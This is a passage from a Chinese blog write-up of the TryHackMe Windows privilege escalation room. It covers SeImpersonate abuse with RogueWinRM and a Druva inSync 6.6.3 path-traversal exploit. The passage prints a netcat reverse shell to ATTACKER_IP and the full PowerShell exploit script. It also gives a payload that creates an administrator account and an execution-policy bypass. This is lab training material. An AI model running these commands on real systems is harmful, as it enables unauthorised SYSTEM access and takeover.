        1 <span class="token function">file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> copied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104737094.png" alt="image-20240206104737094"></p>
<p>最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104746589.png" alt="image-20240206104746589"></p>
<h2 id="4-9-SeImpersonate-SeAssignPrimaryToken">4.9 SeImpersonate / SeAssignPrimaryToken</h2>
<p>这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。</p>
<p>当您考虑 FTP 服务器的工作原理时，就很容易理解模拟。 FTP 服务器必须限制用户只能访问他们应该被允许查看的文件。</p>
<p>假设我们有一个使用用户 <code>ftp</code> 运行的 FTP 服务。在没有模拟的情况下，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104812815.png" alt="image-20240206104812815"></p>
<p>使用 ftp 令牌不是最好的主意有以下几个原因： - 为了正确提供文件， <code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户 <code>ftp</code> 。这增加了复杂性，因为我们必须为每个提供的文件/目录手动配置特定权限。 - 对于操作系统，所有文件均由用户 <code>ftp</code> 访问，与当前登录 FTP 服务的用户无关。这使得无法将授权委托给操作系统；因此，FTP服务必须实现它。 - 如果 FTP 服务在某个时刻遭到破坏，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104823603.png" alt="image-20240206104823603"></p>
<p>现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。</p>
<p>在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件： 1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。 2.找到一种方法来强制特权用户连接并验证生成的恶意进程。</p>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//MACHINE_IP/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104845464.png" alt="image-20240206104845464"></p>
<p>要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在 <code>C:\tools\</code> 文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为 SSH，但使用 Powershell。</p>
<p>如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4442<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">c</span><span class="token punctuation">:</span>\tools\RogueWinRM\RogueWinRM.exe -p <span class="token string">"C:\tools\nc64.exe"</span> -a <span class="token string">"-e cmd.exe ATTACKER_IP 4442"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104909061.png" alt="image-20240206104909061"></p>
<p>注意：该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。</p>
<p><code>-p</code> 参数指定漏洞利用程序运行的可执行文件，在本例中为 <code>nc64.exe</code> 。 <code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者机器建立反向 shell，因此传递给 netcat 的参数将为 <code>-e cmd.exe ATTACKER_IP 4442</code> 。</p>
<p>如果一切设置正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">c</span><span class="token punctuation">:</span>\windows\system32\inetsrv&gt;whoami
nt authority\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-10-未打补丁的软件">4.10 未打补丁的软件</h2>
<p>目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）：</p>
<pre class="line-numbers language-shell-session" data-language="shell-session"><code class="language-shell-session"><span class="token output">wmic product get name,version,vendor</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Remember that the <code>wmic product</code> command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.<br>
请记住， <code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。</p>
<p>一旦我们收集了产品版本信息，我们就可以随时在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>, <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a> 和 <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a>,等网站上在线搜索已安装软件的现有漏洞。</p>
<h3 id="Example：Druva-inSync-6-6-3">Example：Druva inSync 6.6.3</h3>
<p>目标服务器正在运行 Druva inSync 6.6.3，据 Matteo Malvica 报告，该服务器容易受到权限升级的影响。该漏洞是由于对 Chris Lyne 最初针对 6.5.0 版本报告的另一个漏洞应用了错误补丁而导致的。</p>
<p>该软件容易受到攻击，因为它以系统权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。</p>
<p>对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串 <code>C:\ProgramData\Druva\inSync4\</code> 开头，这是允许的二进制文件应该在的地方。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C:\Windows\System32\cmd.exe</code> ，它不在允许的路径中；您只需要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> 即可成功绕过检查。</p>
<p>为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105050216.png" alt="image-20240206105050216"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica 在此发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token variable">$ErrorActionPreference</span> = <span class="token string">"Stop"</span>

<span class="token variable">$cmd</span> = <span class="token string">"net user pwnd /add"</span>

<span class="token variable">$s</span> = New-Object System.Net.Sockets.<span class="token function">Socket</span><span class="token punctuation">(</span>
    [System.Net.Sockets.AddressFamily]<span class="token punctuation">:</span><span class="token punctuation">:</span>InterNetwork<span class="token punctuation">,</span>
    [System.Net.Sockets.SocketType]<span class="token punctuation">:</span><span class="token punctuation">:</span>Stream<span class="token punctuation">,</span>
    [System.Net.Sockets.ProtocolType]<span class="token punctuation">:</span><span class="token punctuation">:</span>Tcp
<span class="token punctuation">)</span>
<span class="token variable">$s</span>.<span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> 6064<span class="token punctuation">)</span>

<span class="token variable">$header</span> = [System.Text.Encoding]<span class="token punctuation">:</span><span class="token punctuation">:</span>UTF8.<span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token string">"inSync PHC RPCW[v0002]"</span><span class="token punctuation">)</span>
<span class="token variable">$rpcType</span> = [System.Text.Encoding]<span class="token punctuation">:</span><span class="token punctuation">:</span>UTF8.<span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token string">"$([char]0x0005)`0`0`0"</span><span class="token punctuation">)</span>
<span class="token variable">$command</span> = [System.Text.Encoding]<span class="token punctuation">:</span><span class="token punctuation">:</span>Unicode.<span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token string">"C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$length</span> = [System.BitConverter]<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token variable">$command</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$s</span>.<span class="token function">Send</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">)</span>
<span class="token variable">$s</span>.<span class="token function">Send</span><span class="token punctuation">(</span><span class="token variable">$rpcType</span><span class="token punctuation">)</span>
<span class="token variable">$s</span>.<span class="token function">Send</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span>
<span class="token variable">$s</span>.<span class="token function">Send</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它（该漏洞也可以在目标计算机中的 <code>C:\tools\Druva_inSync_exploit.txt</code> 中找到）。请注意，在 <code>$cmd</code> 变量中指定的漏洞利用的默认负载将在系统中创建一个名为 <code>pwnd</code> 的用户，但不会为其分配管理权限，因此我们可能想要更改有效负载以获得更有用的东西。对于这个房间，我们将更改有效负载以运行以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这将创建密码为 <code>SimplePass123</code> 的用户 <code>pwnd</code> 并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户 <code>pwnd</code> 是否存在并且属于管理员组：</p>
<p>Command Prompt 命令提示符</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">PS <span class="token property">C</span><span class="token punctuation">:</span>\&gt; net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后一步，您可以以管理员身份运行命令提示符：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105125538.png" alt="image-20240206105125538"></p>
<h1>0x05 自动化工具</h1>
<p>有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。</p>
<p>以下是一些常用于识别权限升级向量的工具。请随意针对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
<h2 id="5-1-WinPEAS">5.1 WinPEAS</h2>
<p>WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。 WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS 的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; winpeas.exe <span class="token operator">&gt;</span> outputfile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>WinPEAS 可在此处下载：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">here</a></p>
<h2 id="5-2-PrivescCheck">5.2 PrivescCheck</h2>
<p>PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
<p>PrivescCheck 可在此处下载 <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">here</a>.</p>
<p>提醒：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">PS <span class="token property">C</span><span class="token punctuation">:</span>\&gt; Set-ExecutionPolicy Bypass -Scope process -Force
PS <span class="token property">C</span><span class="token punctuation">:</span>\&gt; . .\PrivescCheck.ps1
PS <span class="token property">C</span><span class="token punctuation">:</span>\&gt; Invoke-PrivescCheck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="5-3-WES-NG">5.3 WES-NG</h2>
<p>一些漏洞利用建议脚本（例如 winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
<p>WES-NG 是一个 Python 脚本，可以在此处找到并下载。 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">here</a>.</p>
<p>安装后，在使用之前，请键入 <code>wes.py --update</code> 命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。</p>
<p>完成后，<a target="_blank" rel="noopener" href="http://wes.py">wes.py</a> 可以按如下方式运行；</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@kali$ wes.py systeminfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="5-4-Metasploit-元分析软件">5.4 Metasploit 元分析软件</h2>
<p>如果目标系统上已有 Meterpreter shell，则可以使用 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/">http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/TryHackMe/">
                                    <span class="chip bg-color">TryHackMe</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/02/06/thm-windows-ben-di-chi-jiu-xing/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="THM-Windows本地持久性">
                        
                        <span class="card-title">THM-Windows本地持久性</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-02-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/TryHackMe/" class="post-category">
                                    TryHackMe
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/TryHackMe/">
                        <span class="chip bg-color">TryHackMe</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="常规漏洞学习总结">
                        
                        <span class="card-title">常规漏洞学习总结</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-02
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                    web知识总结
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">基本知识</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
